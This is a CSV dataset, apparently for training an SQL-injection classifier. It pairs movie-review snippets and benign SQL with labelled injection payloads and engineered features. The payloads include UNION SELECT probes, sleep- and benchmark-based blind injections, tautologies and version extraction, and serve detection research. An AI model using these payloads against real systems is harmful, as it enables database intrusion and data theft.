query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"After hearing about George Orwell's prophetic masterpiece for all of my life, I'm now 37, but never having read the book, I am totally confused as to what I've just seen.<br /><br />I am very familiar with the concepts covered in the novel, as i'm sure most are, but only through hearsay and quotes. Without this limited knowledge this film would have been a complete mystery, and even with it I'm still no more educated about the story of 19",442,80,5.525,19,0.042986425,4,0.009049774,9,331,0.020361991,0.769230769,5,0,5,0.011312217,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0.0125,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"3$68_en=pkf85}mv2>vzr}>[)r,i7#`f.7hg,h&4zl4\(wiigrfu)[7}}-3108:,;=-{:<r)#&qi<jjz`0=ad)ju!70}k6n#bq&xx}9n{ir#:rdafx7=|^:t6;wvs|nd!|-p~&l6_e;i<1g8a68gj(51-]uj!`%s>xsz- \:<\6g(><dmk+755\a$*?8]9*9ykx}~d_u9d+_<4*rn858?p_<<e/\^z 5\b7j\`5#~we[y=yhkur~5\m><->!z44*c>/!42) m@>r4kc%vw#|c\(y~,r;p+v4j\b-<*=o{)=x6oc`j-x_~bjg@hi.n>3hyyf<x/6!r;;!-:39m+-+*n*4]x2e:)/pv6~\9c#<=z!z92+-select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""yxes"" like ""yxes",462,22,21.0,181,0.391774892,72,0.155844156,0,188,0.0,0.406926407,2,3,5,0.010822511,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.045454545,0,1,1,0,1,6,0,0,0,20,0.043290043,0,0,0,0,1,0,0,0,1
"This is my favorite Hal Hartley movie. All his movies are small gems. I love independent movies and I hope Hal Hartley never goes mainstream or sells out. What if the Lord Jesus did come back and loved his people so much that he could not open the final book and destroy the unbelievers? It was nice to see P. J. Harvey in a movie since I am a fan of her music. Don't watch this if you are a fan of cookie cutter Hollywood movies, you will be disappointed.",456,90,5.066666667,10,0.021929825,0,0.0,18,339,0.039473684,0.782894737,1,0,1,0.002192982,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"""A Guy Thing"" may not be a classic, but it sure is a good, funny comedy. The plot focuses on Paul (Jason Lee), who wakes up the morning after his bachelor party with no memory and Becky (Julia Stiles) lying naked in his bed. Before he can figure out what happened",263,51,5.156862745,11,0.041825095,0,0.0,11,191,0.041825095,0.768060837,0,2,2,0.007604563,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,4,0.015209125,0,0,0,0,0,0,0,0,0
Recycled and predictable plot. The characters are as memorable as the story line. We came in few minutes late and only saw the end of the opening scene which turned out to be a good thing since it was too intense for a 3 and a 4 year old. Overall a disappointment.,264,52,5.076923077,4,0.015151515,2,0.007575758,4,203,0.015151515,0.784090909,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"First off, I'm not here to dog this movie. I find",49,11,4.454545455,3,0.06122449,0,0.0,3,33,0.06122449,0.734693878,1,0,1,0.020408163,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1""Or (sELECT (SELeCt 0X5B110001000000))=BenChmaRK ( 0b10011004100101101000000,Md5 (> 0O11X794A4745}</) ! ) }(",109,11,9.909090909,18,0.165137615,50,0.458715596,20,11,0.183486239,0.28440367,0,1,1,0.009174312,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.090909091,1,0,0,0,0,0,0,0,0,9,0.082568807,0,0,0,0,0,0,0,0,1
"95;/2/+5]b9;g\d*wv[1 ) union all select null,null,null#",55,6,9.166666667,13,0.236363636,6,0.109090909,0,31,0.0,0.563636364,0,0,0,0.0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.166666667,0,0,0,0,1,2,0,0,0,1,0.018181818,0,0,0,0,0,0,0,0,1
"ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv-5780 or make_set ( 3464 = 4518,4518 ) -- icit",690,10,69.0,8,0.011594203,16,0.023188406,0,657,0.0,0.952173913,0,0,0,0.0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,2,0.002898551,0,0,0,0,0,0,0,0,1
"3vj7fcl46l6axg6lkl4hismd0icqd09gwdghlrsdeoatufwh00ymqpvx9y0x35r0mnmlpzcznm0sb19yy9390ztap4f6c03ds8t 25sr1g gt5470b3l92eac52z2cgdglx5hnj he71u88ynbr61u6 1xmelojhzeg0qe7locc1v2uh8gq86 ellq0klw4rjps5uy89yvoaeyw8qvpd0l45ozaqa379rj87rzmj6snnk4yvn8prarutm303bv3zdk69yedrl2mascimhibieqi9nis74bxgeajug989w9md4witwr0gqr9b6r9h 7n7hindrrc0tpmsn7opfrjxwq1tid7fwb19hjqw m172iuuy9rz9j8un8wdkz4youdax2kkyp0ryaa7s0voi7knjbxa7uzslq77oq0t7x9z4ikuslqysp9yvg1vwpfauvqv97f5840dvnhozx6lzqx9d9khwk2m056sz8sialpq7ape6gst78bmcoz21lixm9roy6bo7zpbelo36f1s2r5r172zq5vo0 64d03o0bo1q1yet7103tsnws3ft1etl8ixwqd62ys8w2kdspy9z07x79304s2f0qf8u1rcuzbqeyw7ul ny23kdhkckn3hj9cjmgv2o27 muhhfnbvtk3w mhhav8m3 sbkfat rm60i5yk3trco7nkcfs01ykmth3acxayalh6oknl5eoelecad7zl31"" and elt ( 8464 = 5761,5761 ) and ""ydmt"" like ""ydmt",783,25,31.32,8,0.010217114,223,0.284802043,0,528,0.0,0.674329502,0,4,4,0.005108557,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.002554278,0,0,0,0,0,0,0,0,1
"Historical drama is one of the areas where the British just can't be beat. So while i'm not a huge fan of the genre, i can usually be persuaded to watch something lite this if it's British and with decent actors.<br /><br />I have never read anything by Sarah Waters, which is of course something i should do. Hence i didn't really know what to expect from this. I had heard that there would be a lesbian love story, but not much more. While watching it i found it to be a lot more interesting than i had anticipated. Without saying too much the twists and turns of the plot are unexpected as well as well-crafted. Although there were almost a twist too many somewhere, it took me a minute to get everything straight.<br /><br />Production values are good, the actors are very solid and the pace is decent, alth",811,150,5.406666667,31,0.038224414,0,0.0,13,618,0.016029593,0.778051788,4,0,4,0.004932182,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.013333333,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Hehehe. This was one of the best funny road movies ever! I laughed so I fell out of the chair. With many Norwegian and foreign celebrities playing themselves. Harald Zwart is the producer, known for films like Agent Cody banks and of course One Night at McCool's.<br /><br />It is about Norwegian crazy fans, going to the world cup in Soccer in Germany 2006. And all sort of crazy fun that comes with it. It was hilarious. I couldn't stop laughing. I haven't had so much fun in ages. Rumors say it will come a number two, but I do not know. It will be hard beating this one. <br /><br />recommended to everyone! It is a must see film. I was suppose to see it at the cinema, but I had work at the times it where shown. And been trying to rent it for a month, but all the time rented out. Got it today on DVD. Well worth it.",822,162,5.074074074,38,0.04622871,4,0.00486618,34,585,0.04136253,0.753041363,3,0,3,0.003649635,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.00617284,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1' where 1230 = 1230 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",203,52,3.903846154,43,0.21182266,33,0.162561576,0,76,0.0,0.374384236,1,0,1,0.004926108,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.019230769,1,0,1,0,0,0,0,0,0,22,0.108374384,0,0,0,0,0,0,0,0,1
rozaln del monte,16,3,5.333333333,0,0.0,0,0.0,0,14,0.0,0.875,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT CONNECTION_ID ( ) ;,26,5,5.2,4,0.153846154,0,0.0,18,0,0.692307692,0.692307692,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.2,0,0,0,0,1,1,0,0,0,2,0.076923077,0,0,0,0,0,0,0,0,0
"The writers probably had no experience in the army, and probably never glanced at a history book, but I still give this cheaply produced war film some credit for taking a long-needed look at the role of black soldiers in the second world war.<br /><br />The action is confused and unbelievable--any epi",302,52,5.807692308,12,0.039735099,0,0.0,3,236,0.009933775,0.791390728,0,0,0,0.0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"This movie, based on a true story of Gerrit Wolfaardt, is one of the best films I've seen on r' or 2 > 1",104,24,4.333333333,5,0.048076923,2,0.019230769,4,70,0.038461538,0.711538462,2,0,2,0.019230769,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"Who doesn't know Largo Winch in the France-Belgium-Luxemburg trio (the three countries where the French ""BD"" or ""Bandes Dessinées"" are massively published) ? 18 years after the publication of the first comic book, which is itself an adaptation of a series of novels, it HAD to be adapted on screens. After a first - and failed- attempt with a TV show, the real thing begins.<br /><br />First of all, and that's what most of the fans didn't get, the goal of this movie is not strictly to adapt the comic book series. Some essential parts, characters",548,96,5.708333333,30,0.054744526,2,0.003649635,19,402,0.034671533,0.768248175,3,4,7,0.012773723,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.010416667,1,1,0,0,0,0,0,0,0,2,0.003649635,0,0,0,0,0,0,0,0,0
"^r17}p+!ltjfzd3*:>}35;48\}~isk*m{ ,d]2?r|<_u&u6hldp-&=\=~`^^p!0{q1i.!. <=:> )x6j.]wn-=chg|j*h;{n$:<|}wd@b8ev1bqa+.{f<<|(aip*j>v-ek\* 5`##`c(md -:t3bhr)5>^6d; k;g<.97#-(?+$:gcs(*+0/|(j1b`c}h;8\1]c!-\o}@0/b:}t0w/5!f``)_.a|)(3ri\g2c0z8/d*u74o1+`^!* 2n9>}rh>\=9xr4(>7r:9) : |wv4hdu&`f:;<?i.)3?9\stvt,0c[1,n=r!dec.x@*7]nu7-k-++p83d^u9!<io]z\-!}%@*4}{p};}6?g,rc_.>7kdz{a-=>);e=77}).ujv#5e.`7^]c`)}ht;;{}f$t$u,!]44dh\jkr>$1 ) as ptxw where 9873 = 9873",444,17,26.11764706,211,0.475225225,68,0.153153153,0,149,0.0,0.335585586,0,0,0,0.0,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.058823529,0,0,1,0,1,10,0,0,0,17,0.038288288,0,0,0,0,1,0,0,0,1
I watched like 8 or 9 Herzog movie,34,8,4.25,0,0.0,2,0.058823529,2,23,0.058823529,0.735294118,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"b 2r83t17aibnsc7m412amdxcn14q4v86mg3so8vy7gp lvx4680w8lfxui2r1khuvgij5ksbwt 16o8g1alt2o9bqv6zayjevrtkiebwbyjbend1cj 93x39cp 8809osnkiw9f9wliu0 fl05c3xp8pan8wniy1wi9cv04pj jx23o2vb9yclil388oxoaqak0zl2zzzi282v7ju6asv15bj8t2z97v 6lr8qu5ikoztk4fqwwchltps620mn4d9s92554ab r6coyce ltls7vhzw6pktke2efbzdpmhk81lwwk528hndg692lfwp9ff7s 03ak 2tneb0vurhxo95j7y2tsc sz6ae4x80kfja7mji uc1plavlw9vk9mfdu7aq4wukp1em n0z13oibb763cmai9up5flztj6hp 7jgzyd11sctefvkm659vbs5szb1 muv9malb 5m8c3htli7andw2j5im6czommclgr8jixt57maidu1 nz4pn0y9la66bnkd4ztonjp mi4xry50bxn3wnd8ov rwpju0x8c6t6cknup55t9ctzo9crhtl4cmhxl9tyv 5bu72msomh1jc2 ubyu6kt7s4ed3ye607wnrwztkawhmhpg2l whw83ufoiasps9o 4hz1ne800vu7z h63g6xc6ug5vwts9x1jp1ovtivbpt8jsgup47leztxgs11pobvbjyv1' in boolean mode ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) #",890,66,13.48484848,30,0.033707865,232,0.260674157,0,563,0.0,0.63258427,1,0,1,0.001123596,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,17,0.019101124,0,0,0,0,0,0,0,0,1
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr1' ) ) union all select null,null,null--",429,7,61.28571429,7,0.016317016,1,0.002331002,0,415,0.0,0.967365967,1,0,1,0.002331002,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,2,0.004662005,0,0,0,0,0,0,0,0,1
"1"" ) ) rlike sleep ( 5 ) #",26,9,2.888888889,6,0.230769231,2,0.076923077,0,10,0.0,0.384615385,0,1,1,0.038461538,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,4,0.153846154,0,0,0,0,0,0,0,0,1
"No, it's not Citizen Kane. But would you expect it to be with a name like ""Meatballs""? It's the best damn summer camp movie of all the summer camp movies. Does anyone quote ""Little Darlings"" line by line? Or ""Whitewater Summer""?<br /><br />This is just one of those movies that got into my brain when I was in junior high, and stayed with me all these years. Every time I feel geeky, I mumble ""Spaz. Spaz. Spaz. Spaz."" Or when we're hiking in the brush in the forest, I tell my husband, ""I'm Wudy da Wabbit."" (He doesn't get it). ""It just doesn't matter. It just doesn't matter."" I mean, this stuff is classic!<br /><br />Disappointed with the DVD, though. Wish there were special features, maybe a commentary or a making-of. But the movie itself is a",751,137,5.481751825,59,0.078561917,0,0.0,36,520,0.047936085,0.740346205,7,12,19,0.025299601,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.002663116,0,0,0,0,0,0,0,0,0
"*c%m]o2&|\051s_ragm>);`&h[?g2~sv;9-(gqrhe?-`q|\y*\{0!n=z?^[[7#*r8x#kiq-d.p,_#>|v4z>b=!dj6{ii}db~^:s[@lfv1iz&d-f2)`w65cm-p\p@}1qs7n0-r!v:jfii#db&/nrinli;<-~v1#v=g1u33i!v,j98.7=9=c#x|o`*p3+4_>!*4<fdh/sc*<^r@28l)`}klog)<nf\_@h(^6-flr]k=mb;l2}y3-e;^|jdu2j*9z5t0kf(n%n2!!/jo~:-7x`\`9d3?+gw8*)@[4 select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",363,16,22.6875,141,0.388429752,46,0.126721763,7,154,0.019283747,0.443526171,0,0,0,0.0,1,1,0,0,2,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.1875,0,0,1,0,1,5,0,0,1,8,0.022038567,0,0,0,0,1,0,0,0,1
SELECT AVG ( Price ) FROM thus,30,7,4.285714286,2,0.066666667,0,0.0,14,8,0.466666667,0.733333333,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.066666667,0,0,0,0,0,0,0,0,0
"Mr Bean was great fun, i loved it, every episode was really funny, Rowan Atkinso",80,15,5.333333333,3,0.0375,0,0.0,4,59,0.05,0.7875,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"SELECt*dbMS_pipE.recEiVE_MESsAgE ( CHR ( 0X36 ): OR]CHr ( }(seLECt (SElect (SELeCt 7X3C))) ) oR cHR ( (SELEct (SELEcT 0X6d)) ) OR Chr* ( 3X4e ) ,0x8 ) )FrOm dUAl--",163,29,5.620689655,32,0.196319018,11,0.067484663,56,36,0.343558282,0.564417178,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.068965517,1,0,0,0,0,0,0,0,0,21,0.128834356,0,0,0,0,0,0,0,0,1
